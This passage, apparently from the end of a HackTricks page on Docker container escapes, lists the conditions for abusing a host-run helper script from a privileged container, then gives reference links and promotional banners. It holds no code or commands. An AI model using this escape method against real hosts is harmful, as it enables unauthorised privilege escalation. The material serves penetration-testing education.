* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
